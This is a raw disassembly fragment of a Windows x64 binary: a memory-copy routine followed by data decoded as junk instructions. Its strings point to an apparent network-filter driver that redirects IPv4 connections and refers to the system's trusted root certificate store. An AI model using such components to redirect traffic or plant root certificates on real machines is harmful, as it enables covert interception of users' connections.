   14000734e:	0f 10 64 11 30       	movups 0x30(%rcx,%rdx,1),%xmm4
   140007353:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   140007357:	48 83 c1 40          	add    $0x40,%rcx
   14000735b:	49 ff c9             	dec    %r9
   14000735e:	0f 29 49 c0          	movaps %xmm1,-0x40(%rcx)
   140007362:	0f 29 51 d0          	movaps %xmm2,-0x30(%rcx)
   140007366:	0f 29 59 e0          	movaps %xmm3,-0x20(%rcx)
   14000736a:	0f 28 c4             	movaps %xmm4,%xmm0
   14000736d:	75 d1                	jne    0x140007340
   14000736f:	4d 8b c8             	mov    %r8,%r9
   140007372:	49 c1 e9 04          	shr    $0x4,%r9
   140007376:	74 19                	je     0x140007391
   140007378:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000737f:	00 
   140007380:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   140007384:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   140007388:	48 83 c1 10          	add    $0x10,%rcx
   14000738c:	49 ff c9             	dec    %r9
   14000738f:	75 ef                	jne    0x140007380
   140007391:	49 83 e0 0f          	and    $0xf,%r8
   140007395:	74 0e                	je     0x1400073a5
   140007397:	4e 8d 5c 01 f0       	lea    -0x10(%rcx,%r8,1),%r11
   14000739c:	41 0f 10 0c 13       	movups (%r11,%rdx,1),%xmm1
   1400073a1:	41 0f 11 0b          	movups %xmm1,(%r11)
   1400073a5:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   1400073a9:	c3                   	ret
   1400073aa:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400073b1:	0f 1f 84 00 00 00 00 
   1400073b8:	00 
   1400073b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400073c0:	4d 8b c8             	mov    %r8,%r9
   1400073c3:	49 c1 e9 06          	shr    $0x6,%r9
   1400073c7:	49 83 e0 3f          	and    $0x3f,%r8
   1400073cb:	0f 18 44 11 40       	prefetchnta 0x40(%rcx,%rdx,1)
   1400073d0:	eb 2e                	jmp    0x140007400
   1400073d2:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400073d9:	0f 1f 84 00 00 00 00 
   1400073e0:	00 
   1400073e1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400073e8:	0f 1f 84 00 00 00 00 
   1400073ef:	00 
   1400073f0:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400073f7:	0f 1f 84 00 00 00 00 
   1400073fe:	00 
   1400073ff:	90                   	nop
   140007400:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140007404:	0f 10 54 11 10       	movups 0x10(%rcx,%rdx,1),%xmm2
   140007409:	0f 10 5c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm3
   14000740e:	0f 10 64 11 30       	movups 0x30(%rcx,%rdx,1),%xmm4
   140007413:	0f 2b 41 f0          	movntps %xmm0,-0x10(%rcx)
   140007417:	48 83 c1 40          	add    $0x40,%rcx
   14000741b:	0f 18 44 11 40       	prefetchnta 0x40(%rcx,%rdx,1)
   140007420:	49 ff c9             	dec    %r9
   140007423:	0f 2b 49 c0          	movntps %xmm1,-0x40(%rcx)
   140007427:	0f 2b 51 d0          	movntps %xmm2,-0x30(%rcx)
   14000742b:	0f 2b 59 e0          	movntps %xmm3,-0x20(%rcx)
   14000742f:	0f 28 c4             	movaps %xmm4,%xmm0
   140007432:	75 cc                	jne    0x140007400
   140007434:	0f ae f8             	sfence
   140007437:	e9 33 ff ff ff       	jmp    0x14000736f
   14000743c:	0f 1f 40 00          	nopl   0x0(%rax)
   140007440:	49 03 c8             	add    %r8,%rcx
   140007443:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   140007448:	48 83 e9 10          	sub    $0x10,%rcx
   14000744c:	49 83 e8 10          	sub    $0x10,%r8
   140007450:	f6 c1 0f             	test   $0xf,%cl
   140007453:	74 18                	je     0x14000746d
   140007455:	4c 8b d9             	mov    %rcx,%r11
   140007458:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000745c:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   140007460:	41 0f 11 03          	movups %xmm0,(%r11)
   140007464:	0f 28 c1             	movaps %xmm1,%xmm0
   140007467:	4c 8b c1             	mov    %rcx,%r8
   14000746a:	4c 2b c0             	sub    %rax,%r8
   14000746d:	4d 8b c8             	mov    %r8,%r9
   140007470:	49 c1 e9 06          	shr    $0x6,%r9
   140007474:	74 39                	je     0x1400074af
   140007476:	49 83 e0 3f          	and    $0x3f,%r8
   14000747a:	eb 04                	jmp    0x140007480
   14000747c:	0f 1f 40 00          	nopl   0x0(%rax)
   140007480:	0f 10 4c 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm1
   140007485:	0f 10 54 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm2
   14000748a:	0f 10 5c 11 d0       	movups -0x30(%rcx,%rdx,1),%xmm3
   14000748f:	0f 10 64 11 c0       	movups -0x40(%rcx,%rdx,1),%xmm4
   140007494:	0f 29 01             	movaps %xmm0,(%rcx)
   140007497:	48 83 e9 40          	sub    $0x40,%rcx
   14000749b:	49 ff c9             	dec    %r9
   14000749e:	0f 29 49 30          	movaps %xmm1,0x30(%rcx)
   1400074a2:	0f 29 51 20          	movaps %xmm2,0x20(%rcx)
   1400074a6:	0f 29 59 10          	movaps %xmm3,0x10(%rcx)
   1400074aa:	0f 28 c4             	movaps %xmm4,%xmm0
   1400074ad:	75 d1                	jne    0x140007480
   1400074af:	4d 8b c8             	mov    %r8,%r9
   1400074b2:	49 c1 e9 04          	shr    $0x4,%r9
   1400074b6:	74 19                	je     0x1400074d1
   1400074b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400074bf:	00 
   1400074c0:	0f 29 01             	movaps %xmm0,(%rcx)
   1400074c3:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   1400074c8:	48 83 e9 10          	sub    $0x10,%rcx
   1400074cc:	49 ff c9             	dec    %r9
   1400074cf:	75 ef                	jne    0x1400074c0
   1400074d1:	49 83 e0 0f          	and    $0xf,%r8
   1400074d5:	74 0f                	je     0x1400074e6
   1400074d7:	4c 8b d9             	mov    %rcx,%r11
   1400074da:	4d 2b d8             	sub    %r8,%r11
   1400074dd:	41 0f 10 0c 13       	movups (%r11,%rdx,1),%xmm1
   1400074e2:	41 0f 11 0b          	movups %xmm1,(%r11)
   1400074e6:	0f 29 01             	movaps %xmm0,(%rcx)
   1400074e9:	c3                   	ret
   1400074ea:	cc                   	int3
   1400074eb:	cc                   	int3
   1400074ec:	cc                   	int3
   1400074ed:	cc                   	int3
   1400074ee:	cc                   	int3
   1400074ef:	cc                   	int3
   1400074f0:	49 00 6d 00          	rex.WB add %bpl,0x0(%r13)
   1400074f4:	61                   	(bad)
   1400074f5:	00 67 00             	add    %ah,0x0(%rdi)
   1400074f8:	65 00 50 00          	add    %dl,%gs:0x0(%rax)
   1400074fc:	61                   	(bad)
   1400074fd:	00 74 00 68          	add    %dh,0x68(%rax,%rax,1)
   140007501:	00 00                	add    %al,(%rax)
   140007503:	00 cc                	add    %cl,%ah
   140007505:	cc                   	int3
   140007506:	cc                   	int3
   140007507:	cc                   	int3
   140007508:	cc                   	int3
   140007509:	cc                   	int3
   14000750a:	cc                   	int3
   14000750b:	cc                   	int3
   14000750c:	cc                   	int3
   14000750d:	cc                   	int3
   14000750e:	cc                   	int3
   14000750f:	cc                   	int3
   140007510:	2f                   	(bad)
   140007511:	2f                   	(bad)
   140007512:	00 cc                	add    %cl,%ah
   140007514:	cc                   	int3
   140007515:	cc                   	int3
   140007516:	cc                   	int3
   140007517:	cc                   	int3
   140007518:	cc                   	int3
   140007519:	cc                   	int3
   14000751a:	cc                   	int3
   14000751b:	cc                   	int3
   14000751c:	cc                   	int3
   14000751d:	cc                   	int3
   14000751e:	cc                   	int3
   14000751f:	cc                   	int3
   140007520:	38 30                	cmp    %dh,(%rax)
   140007522:	00 cc                	add    %cl,%ah
   140007524:	cc                   	int3
   140007525:	cc                   	int3
   140007526:	cc                   	int3
   140007527:	cc                   	int3
   140007528:	cc                   	int3
   140007529:	cc                   	int3
   14000752a:	cc                   	int3
   14000752b:	cc                   	int3
   14000752c:	cc                   	int3
   14000752d:	cc                   	int3
   14000752e:	cc                   	int3
   14000752f:	cc                   	int3
   140007530:	2f                   	(bad)
   140007531:	00 cc                	add    %cl,%ah
   140007533:	cc                   	int3
   140007534:	cc                   	int3
   140007535:	cc                   	int3
   140007536:	cc                   	int3
   140007537:	cc                   	int3
   140007538:	cc                   	int3
   140007539:	cc                   	int3
   14000753a:	cc                   	int3
   14000753b:	cc                   	int3
   14000753c:	cc                   	int3
   14000753d:	cc                   	int3
   14000753e:	cc                   	int3
   14000753f:	cc                   	int3
   140007540:	25 00 30 00 34       	and    $0x34003000,%eax
   140007545:	00 64 00 2d          	add    %ah,0x2d(%rax,%rax,1)
   140007549:	00 25 00 30 00 32    	add    %ah,0x32003000(%rip)        # 0x17200a54f
   14000754f:	00 64 00 2d          	add    %ah,0x2d(%rax,%rax,1)
   140007553:	00 25 00 30 00 32    	add    %ah,0x32003000(%rip)        # 0x17200a559
   140007559:	00 64 00 20          	add    %ah,0x20(%rax,%rax,1)
   14000755d:	00 25 00 30 00 32    	add    %ah,0x32003000(%rip)        # 0x17200a563
   140007563:	00 64 00 3a          	add    %ah,0x3a(%rax,%rax,1)
   140007567:	00 25 00 30 00 32    	add    %ah,0x32003000(%rip)        # 0x17200a56d
   14000756d:	00 64 00 3a          	add    %ah,0x3a(%rax,%rax,1)
   140007571:	00 25 00 30 00 32    	add    %ah,0x32003000(%rip)        # 0x17200a577
   140007577:	00 64 00 00          	add    %ah,0x0(%rax,%rax,1)
   14000757b:	00 cc                	add    %cl,%ah
   14000757d:	cc                   	int3
   14000757e:	cc                   	int3
   14000757f:	cc                   	int3
   140007580:	5b                   	pop    %rbx
   140007581:	25 73 20 25 77       	and    $0x77252073,%eax
   140007586:	73 5d                	jae    0x1400075e5
   140007588:	20 00                	and    %al,(%rax)
   14000758a:	cc                   	int3
   14000758b:	cc                   	int3
   14000758c:	cc                   	int3
   14000758d:	cc                   	int3
   14000758e:	cc                   	int3
   14000758f:	cc                   	int3
   140007590:	5b                   	pop    %rbx
   140007591:	25 73 5d 20 00       	and    $0x205d73,%eax
   140007596:	cc                   	int3
   140007597:	cc                   	int3
   140007598:	cc                   	int3
   140007599:	cc                   	int3
   14000759a:	cc                   	int3
   14000759b:	cc                   	int3
   14000759c:	cc                   	int3
   14000759d:	cc                   	int3
   14000759e:	cc                   	int3
   14000759f:	cc                   	int3
   1400075a0:	5b                   	pop    %rbx
   1400075a1:	25 77 73 5d 20       	and    $0x205d7377,%eax
   1400075a6:	00 cc                	add    %cl,%ah
   1400075a8:	cc                   	int3
   1400075a9:	cc                   	int3
   1400075aa:	cc                   	int3
   1400075ab:	cc                   	int3
   1400075ac:	cc                   	int3
   1400075ad:	cc                   	int3
   1400075ae:	cc                   	int3
   1400075af:	cc                   	int3
   1400075b0:	0d 0a 00 cc cc       	or     $0xcccc000a,%eax
   1400075b5:	cc                   	int3
   1400075b6:	cc                   	int3
   1400075b7:	cc                   	int3
   1400075b8:	cc                   	int3
   1400075b9:	cc                   	int3
   1400075ba:	cc                   	int3
   1400075bb:	cc                   	int3
   1400075bc:	cc                   	int3
   1400075bd:	cc                   	int3
   1400075be:	cc                   	int3
   1400075bf:	cc                   	int3
   1400075c0:	4e                   	rex.WRX
   1400075c1:	45 54                	rex.RB push %r12
   1400075c3:	5f                   	pop    %rdi
   1400075c4:	46                   	rex.RX
   1400075c5:	49                   	rex.WB
   1400075c6:	4c 54                	rex.WR push %rsp
   1400075c8:	45 52                	rex.RB push %r10
   1400075ca:	00 cc                	add    %cl,%ah
   1400075cc:	cc                   	int3
   1400075cd:	cc                   	int3
   1400075ce:	cc                   	int3
   1400075cf:	cc                   	int3
   1400075d0:	5c                   	pop    %rsp
   1400075d1:	00 3f                	add    %bh,(%rdi)
   1400075d3:	00 3f                	add    %bh,(%rdi)
   1400075d5:	00 5c 00 6e          	add    %bl,0x6e(%rax,%rax,1)
   1400075d9:	00 65 00             	add    %ah,0x0(%rbp)
   1400075dc:	74 00                	je     0x1400075de
   1400075de:	66 00 69 00          	data16 add %ch,0x0(%rcx)
   1400075e2:	6c                   	insb   (%dx),(%rdi)
   1400075e3:	00 74 00 65          	add    %dh,0x65(%rax,%rax,1)
   1400075e7:	00 72 00             	add    %dh,0x0(%rdx)
   1400075ea:	00 00                	add    %al,(%rax)
   1400075ec:	cc                   	int3
   1400075ed:	cc                   	int3
   1400075ee:	cc                   	int3
   1400075ef:	cc                   	int3
   1400075f0:	5c                   	pop    %rsp
   1400075f1:	00 44 00 65          	add    %al,0x65(%rax,%rax,1)
   1400075f5:	00 76 00             	add    %dh,0x0(%rsi)
   1400075f8:	69 00 63 00 65 00    	imul   $0x650063,(%rax),%eax
   1400075fe:	5c                   	pop    %rsp
   1400075ff:	00 6e 00             	add    %ch,0x0(%rsi)
   140007602:	65 00 74 00 66       	add    %dh,%gs:0x66(%rax,%rax,1)
   140007607:	00 69 00             	add    %ch,0x0(%rcx)
   14000760a:	6c                   	insb   (%dx),(%rdi)
   14000760b:	00 74 00 65          	add    %dh,0x65(%rax,%rax,1)
   14000760f:	00 72 00             	add    %dh,0x0(%rdx)
   140007612:	00 00                	add    %al,(%rax)
   140007614:	cc                   	int3
   140007615:	cc                   	int3
   140007616:	cc                   	int3
   140007617:	cc                   	int3
   140007618:	cc                   	int3
   140007619:	cc                   	int3
   14000761a:	cc                   	int3
   14000761b:	cc                   	int3
   14000761c:	cc                   	int3
   14000761d:	cc                   	int3
   14000761e:	cc                   	int3
   14000761f:	cc                   	int3
   140007620:	25 30 32 78 25       	and    $0x25783230,%eax
   140007625:	30 32                	xor    %dh,(%rdx)
   140007627:	78 25                	js     0x14000764e
   140007629:	30 32                	xor    %dh,(%rdx)
   14000762b:	78 25                	js     0x140007652
   14000762d:	30 32                	xor    %dh,(%rdx)
   14000762f:	78 25                	js     0x140007656
   140007631:	30 32                	xor    %dh,(%rdx)
   140007633:	78 25                	js     0x14000765a
   140007635:	30 32                	xor    %dh,(%rdx)
   140007637:	78 25                	js     0x14000765e
   140007639:	30 32                	xor    %dh,(%rdx)
   14000763b:	78 25                	js     0x140007662
   14000763d:	30 32                	xor    %dh,(%rdx)
   14000763f:	78 25                	js     0x140007666
   140007641:	30 32                	xor    %dh,(%rdx)
   140007643:	78 25                	js     0x14000766a
   140007645:	30 32                	xor    %dh,(%rdx)
   140007647:	78 25                	js     0x14000766e
   140007649:	30 32                	xor    %dh,(%rdx)
   14000764b:	78 25                	js     0x140007672
   14000764d:	30 32                	xor    %dh,(%rdx)
   14000764f:	78 25                	js     0x140007676
   140007651:	30 32                	xor    %dh,(%rdx)
   140007653:	78 25                	js     0x14000767a
   140007655:	30 32                	xor    %dh,(%rdx)
   140007657:	78 25                	js     0x14000767e
   140007659:	30 32                	xor    %dh,(%rdx)
   14000765b:	78 25                	js     0x140007682
   14000765d:	30 32                	xor    %dh,(%rdx)
   14000765f:	78 00                	js     0x140007661
   140007661:	cc                   	int3
   140007662:	cc                   	int3
   140007663:	cc                   	int3
   140007664:	cc                   	int3
   140007665:	cc                   	int3
   140007666:	cc                   	int3
   140007667:	cc                   	int3
   140007668:	cc                   	int3
   140007669:	cc                   	int3
   14000766a:	cc                   	int3
   14000766b:	cc                   	int3
   14000766c:	cc                   	int3
   14000766d:	cc                   	int3
   14000766e:	cc                   	int3
   14000766f:	cc                   	int3
   140007670:	33 00                	xor    (%rax),%eax
   140007672:	32 00                	xor    (%rax),%al
   140007674:	30 00                	xor    %al,(%rax)
   140007676:	30 00                	xor    %al,(%rax)
   140007678:	30 00                	xor    %al,(%rax)
   14000767a:	30 00                	xor    %al,(%rax)
   14000767c:	00 00                	add    %al,(%rax)
   14000767e:	cc                   	int3
   14000767f:	cc                   	int3
   140007680:	72 00                	jb     0x140007682
   140007682:	65 00 64 00 69       	add    %ah,%gs:0x69(%rax,%rax,1)
   140007687:	00 72 00             	add    %dh,0x0(%rdx)
   14000768a:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   14000768e:	74 00                	je     0x140007690
   140007690:	43 00 61 00          	rex.XB add %spl,0x0(%r9)
   140007694:	6c                   	insb   (%dx),(%rdi)
   140007695:	00 6c 00 6f          	add    %ch,0x6f(%rax,%rax,1)
   140007699:	00 75 00             	add    %dh,0x0(%rbp)
   14000769c:	74 00                	je     0x14000769e
   14000769e:	56                   	push   %rsi
   14000769f:	00 34 00             	add    %dh,(%rax,%rax,1)
   1400076a2:	00 00                	add    %al,(%rax)
   1400076a4:	cc                   	int3
   1400076a5:	cc                   	int3
   1400076a6:	cc                   	int3
   1400076a7:	cc                   	int3
   1400076a8:	cc                   	int3
   1400076a9:	cc                   	int3
   1400076aa:	cc                   	int3
   1400076ab:	cc                   	int3
   1400076ac:	cc                   	int3
   1400076ad:	cc                   	int3
   1400076ae:	cc                   	int3
   1400076af:	cc                   	int3
   1400076b0:	49 00 50 00          	rex.WB add %dl,0x0(%r8)
   1400076b4:	76 00                	jbe    0x1400076b6
   1400076b6:	34 00                	xor    $0x0,%al
   1400076b8:	20 00                	and    %al,(%rax)
   1400076ba:	63 00                	movsxd (%rax),%eax
   1400076bc:	61                   	(bad)
   1400076bd:	00 6c 00 6c          	add    %ch,0x6c(%rax,%rax,1)
   1400076c1:	00 6f 00             	add    %ch,0x0(%rdi)
   1400076c4:	75 00                	jne    0x1400076c6
   1400076c6:	74 00                	je     0x1400076c8
   1400076c8:	20 00                	and    %al,(%rax)
   1400076ca:	66 00 6f 00          	data16 add %ch,0x0(%rdi)
   1400076ce:	72 00                	jb     0x1400076d0
   1400076d0:	20 00                	and    %al,(%rax)
   1400076d2:	72 00                	jb     0x1400076d4
   1400076d4:	65 00 64 00 69       	add    %ah,%gs:0x69(%rax,%rax,1)
   1400076d9:	00 72 00             	add    %dh,0x0(%rdx)
   1400076dc:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   1400076e0:	74 00                	je     0x1400076e2
   1400076e2:	00 00                	add    %al,(%rax)
   1400076e4:	cc                   	int3
   1400076e5:	cc                   	int3
   1400076e6:	cc                   	int3
   1400076e7:	cc                   	int3
   1400076e8:	cc                   	int3
   1400076e9:	cc                   	int3
   1400076ea:	cc                   	int3
   1400076eb:	cc                   	int3
   1400076ec:	cc                   	int3
   1400076ed:	cc                   	int3
   1400076ee:	cc                   	int3
   1400076ef:	cc                   	int3
   1400076f0:	72 00                	jb     0x1400076f2
   1400076f2:	65 00 64 00 69       	add    %ah,%gs:0x69(%rax,%rax,1)
   1400076f7:	00 72 00             	add    %dh,0x0(%rdx)
   1400076fa:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   1400076fe:	74 00                	je     0x140007700
   140007700:	53                   	push   %rbx
   140007701:	00 75 00             	add    %dh,0x0(%rbp)
   140007704:	62                   	(bad)
   140007705:	00 6c 00 61          	add    %ch,0x61(%rax,%rax,1)
   140007709:	00 79 00             	add    %bh,0x0(%rcx)
   14000770c:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140007710:	00 00                	add    %al,(%rax)
   140007712:	cc                   	int3
   140007713:	cc                   	int3
   140007714:	cc                   	int3
   140007715:	cc                   	int3
   140007716:	cc                   	int3
   140007717:	cc                   	int3
   140007718:	cc                   	int3
   140007719:	cc                   	int3
   14000771a:	cc                   	int3
   14000771b:	cc                   	int3
   14000771c:	cc                   	int3
   14000771d:	cc                   	int3
   14000771e:	cc                   	int3
   14000771f:	cc                   	int3
   140007720:	53                   	push   %rbx
   140007721:	00 75 00             	add    %dh,0x0(%rbp)
   140007724:	62                   	(bad)
   140007725:	00 6c 00 61          	add    %ch,0x61(%rax,%rax,1)
   140007729:	00 79 00             	add    %bh,0x0(%rcx)
   14000772c:	65 00 72 00          	add    %dh,%gs:0x0(%rdx)
   140007730:	20 00                	and    %al,(%rax)
   140007732:	66 00 6f 00          	data16 add %ch,0x0(%rdi)
   140007736:	72 00                	jb     0x140007738
   140007738:	20 00                	and    %al,(%rax)
   14000773a:	72 00                	jb     0x14000773c
   14000773c:	65 00 64 00 69       	add    %ah,%gs:0x69(%rax,%rax,1)
   140007741:	00 72 00             	add    %dh,0x0(%rdx)
   140007744:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   140007748:	74 00                	je     0x14000774a
   14000774a:	00 00                	add    %al,(%rax)
   14000774c:	cc                   	int3
   14000774d:	cc                   	int3
   14000774e:	cc                   	int3
   14000774f:	cc                   	int3
   140007750:	72 00                	jb     0x140007752
   140007752:	65 00 64 00 69       	add    %ah,%gs:0x69(%rax,%rax,1)
   140007757:	00 72 00             	add    %dh,0x0(%rdx)
   14000775a:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   14000775e:	74 00                	je     0x140007760
   140007760:	46 00 69 00          	rex.RX add %r13b,0x0(%rcx)
   140007764:	6c                   	insb   (%dx),(%rdi)
   140007765:	00 74 00 65          	add    %dh,0x65(%rax,%rax,1)
   140007769:	00 72 00             	add    %dh,0x0(%rdx)
   14000776c:	56                   	push   %rsi
   14000776d:	00 34 00             	add    %dh,(%rax,%rax,1)
   140007770:	00 00                	add    %al,(%rax)
   140007772:	cc                   	int3
   140007773:	cc                   	int3
   140007774:	cc                   	int3
   140007775:	cc                   	int3
   140007776:	cc                   	int3
   140007777:	cc                   	int3
   140007778:	cc                   	int3
   140007779:	cc                   	int3
   14000777a:	cc                   	int3
   14000777b:	cc                   	int3
   14000777c:	cc                   	int3
   14000777d:	cc                   	int3
   14000777e:	cc                   	int3
   14000777f:	cc                   	int3
   140007780:	49 00 50 00          	rex.WB add %dl,0x0(%r8)
   140007784:	76 00                	jbe    0x140007786
   140007786:	34 00                	xor    $0x0,%al
   140007788:	20 00                	and    %al,(%rax)
   14000778a:	66 00 69 00          	data16 add %ch,0x0(%rcx)
   14000778e:	6c                   	insb   (%dx),(%rdi)
   14000778f:	00 74 00 65          	add    %dh,0x65(%rax,%rax,1)
   140007793:	00 72 00             	add    %dh,0x0(%rdx)
   140007796:	20 00                	and    %al,(%rax)
   140007798:	66 00 6f 00          	data16 add %ch,0x0(%rdi)
   14000779c:	72 00                	jb     0x14000779e
   14000779e:	20 00                	and    %al,(%rax)
   1400077a0:	72 00                	jb     0x1400077a2
   1400077a2:	65 00 64 00 69       	add    %ah,%gs:0x69(%rax,%rax,1)
   1400077a7:	00 72 00             	add    %dh,0x0(%rdx)
   1400077aa:	65 00 63 00          	add    %ah,%gs:0x0(%rbx)
   1400077ae:	74 00                	je     0x1400077b0
   1400077b0:	00 00                	add    %al,(%rax)
   1400077b2:	cc                   	int3
   1400077b3:	cc                   	int3
   1400077b4:	cc                   	int3
   1400077b5:	cc                   	int3
   1400077b6:	cc                   	int3
   1400077b7:	cc                   	int3
   1400077b8:	cc                   	int3
   1400077b9:	cc                   	int3
   1400077ba:	cc                   	int3
   1400077bb:	cc                   	int3
   1400077bc:	cc                   	int3
   1400077bd:	cc                   	int3
   1400077be:	cc                   	int3
   1400077bf:	cc                   	int3
   1400077c0:	63 61 6c             	movsxd 0x6c(%rcx),%esp
   1400077c3:	6c                   	insb   (%dx),(%rdi)
   1400077c4:	6f                   	outsl  (%rsi),(%dx)
   1400077c5:	75 74                	jne    0x14000783b
   1400077c7:	5f                   	pop    %rdi
   1400077c8:	63 6c 61 73          	movsxd 0x73(%rcx,%riz,2),%ebp
   1400077cc:	73 69                	jae    0x140007837
   1400077ce:	66 79 7c             	data16 jns 0x14000784d
   1400077d1:	46 77 70             	rex.RX ja 0x140007844
   1400077d4:	73 41                	jae    0x140007817
   1400077d6:	63 71 75             	movsxd 0x75(%rcx),%esi
   1400077d9:	69 72 65 43 6c 61 73 	imul   $0x73616c43,0x65(%rdx),%esi
   1400077e0:	73 69                	jae    0x14000784b
   1400077e2:	66 79 48             	data16 jns 0x14000782d
   1400077e5:	61                   	(bad)
   1400077e6:	6e                   	outsb  (%rsi),(%dx)
   1400077e7:	64 6c                	fs insb (%dx),(%rdi)
   1400077e9:	65 20 65 72          	and    %ah,%gs:0x72(%rbp)
   1400077ed:	72 6f                	jb     0x14000785e
   1400077ef:	72 21                	jb     0x140007812
   1400077f1:	73 74                	jae    0x140007867
   1400077f3:	61                   	(bad)
   1400077f4:	74 75                	je     0x14000786b
   1400077f6:	73 3d                	jae    0x140007835
   1400077f8:	25 78 00 cc cc       	and    $0xcccc0078,%eax
   1400077fd:	cc                   	int3
   1400077fe:	cc                   	int3
   1400077ff:	cc                   	int3
   140007800:	72 65                	jb     0x140007867
   140007802:	6d                   	insl   (%dx),(%rdi)
   140007803:	6f                   	outsl  (%rsi),(%dx)
   140007804:	74 65                	je     0x14000786b
   140007806:	49 70 3a             	rex.WB jo 0x140007843
   140007809:	25 64 2e 25 64       	and    $0x64252e64,%eax
   14000780e:	2e 25 64 2e 25 64    	cs and $0x64252e64,%eax
   140007814:	3a 25 64 20 61 64    	cmp    0x64612064(%rip),%ah        # 0x1a461987e
   14000781a:	64 72 3a             	fs jb  0x140007857
   14000781d:	25 64 20 74 61       	and    $0x61742064,%eax
   140007822:	72 67                	jb     0x14000788b
   140007824:	65 74 5f             	gs je  0x140007886
   140007827:	70 6f                	jo     0x140007898
   140007829:	72 74                	jb     0x14000789f
   14000782b:	3a 25 64 00 cc 25    	cmp    0x25cc0064(%rip),%ah        # 0x165cc7895
   140007831:	73 63                	jae    0x140007896
   140007833:	3d 25 73 00 cc       	cmp    $0xcc007325,%eax
   140007838:	cc                   	int3
   140007839:	cc                   	int3
   14000783a:	cc                   	int3
   14000783b:	cc                   	int3
   14000783c:	cc                   	int3
   14000783d:	cc                   	int3
   14000783e:	cc                   	int3
   14000783f:	cc                   	int3
   140007840:	6f                   	outsl  (%rsi),(%dx)
   140007841:	6b 00 cc             	imul   $0xffffffcc,(%rax),%eax
   140007844:	cc                   	int3
   140007845:	cc                   	int3
   140007846:	cc                   	int3
   140007847:	cc                   	int3
   140007848:	cc                   	int3
   140007849:	cc                   	int3
   14000784a:	cc                   	int3
   14000784b:	cc                   	int3
   14000784c:	cc                   	int3
   14000784d:	cc                   	int3
   14000784e:	cc                   	int3
   14000784f:	cc                   	int3
   140007850:	25 30 38 58 25       	and    $0x25583830,%eax
   140007855:	30 38                	xor    %bh,(%rax)
   140007857:	58                   	pop    %rax
   140007858:	00 cc                	add    %cl,%ah
   14000785a:	cc                   	int3
   14000785b:	cc                   	int3
   14000785c:	cc                   	int3
   14000785d:	cc                   	int3
   14000785e:	cc                   	int3
   14000785f:	cc                   	int3
   140007860:	5b                   	pop    %rbx
   140007861:	00 cc                	add    %cl,%ah
   140007863:	cc                   	int3
   140007864:	cc                   	int3
   140007865:	cc                   	int3
   140007866:	cc                   	int3
   140007867:	cc                   	int3
   140007868:	cc                   	int3
   140007869:	cc                   	int3
   14000786a:	cc                   	int3
   14000786b:	cc                   	int3
   14000786c:	cc                   	int3
   14000786d:	cc                   	int3
   14000786e:	cc                   	int3
   14000786f:	cc                   	int3
   140007870:	5d                   	pop    %rbp
   140007871:	00 cc                	add    %cl,%ah
   140007873:	cc                   	int3
   140007874:	cc                   	int3
   140007875:	cc                   	int3
   140007876:	cc                   	int3
   140007877:	cc                   	int3
   140007878:	cc                   	int3
   140007879:	cc                   	int3
   14000787a:	cc                   	int3
   14000787b:	cc                   	int3
   14000787c:	cc                   	int3
   14000787d:	cc                   	int3
   14000787e:	cc                   	int3
   14000787f:	cc                   	int3
   140007880:	7b 00                	jnp    0x140007882
   140007882:	cc                   	int3
   140007883:	cc                   	int3
   140007884:	cc                   	int3
   140007885:	cc                   	int3
   140007886:	cc                   	int3
   140007887:	cc                   	int3
   140007888:	cc                   	int3
   140007889:	cc                   	int3
   14000788a:	cc                   	int3
   14000788b:	cc                   	int3
   14000788c:	cc                   	int3
   14000788d:	cc                   	int3
   14000788e:	cc                   	int3
   14000788f:	cc                   	int3
   140007890:	5c                   	pop    %rsp
   140007891:	52                   	push   %rdx
   140007892:	65 67 69 73 74 72 79 	imul   $0x4d5c7972,%gs:0x74(%ebx),%esi
   140007899:	5c 4d 
   14000789b:	61                   	(bad)
   14000789c:	63 68 69             	movsxd 0x69(%rax),%ebp
   14000789f:	6e                   	outsb  (%rsi),(%dx)
   1400078a0:	65 5c                	gs pop %rsp
   1400078a2:	53                   	push   %rbx
   1400078a3:	4f                   	rex.WRXB
   1400078a4:	46 54                	rex.RX push %rsp
   1400078a6:	57                   	push   %rdi
   1400078a7:	41 52                	push   %r10
   1400078a9:	45 5c                	rex.RB pop %r12
   1400078ab:	4d 69 63 72 6f 73 6f 	imul   $0x666f736f,0x72(%r11),%r12
   1400078b2:	66 
   1400078b3:	74 5c                	je     0x140007911
   1400078b5:	53                   	push   %rbx
   1400078b6:	79 73                	jns    0x14000792b
   1400078b8:	74 65                	je     0x14000791f
   1400078ba:	6d                   	insl   (%dx),(%rdi)
   1400078bb:	43                   	rex.XB
   1400078bc:	65 72 74             	gs jb  0x140007933
   1400078bf:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%rsi),%esp
   1400078c6:	73 5c                	jae    0x140007924
   1400078c8:	52                   	push   %rdx
   1400078c9:	4f                   	rex.WRXB
   1400078ca:	4f 54                	rex.WRXB push %r12
   1400078cc:	5c                   	pop    %rsp
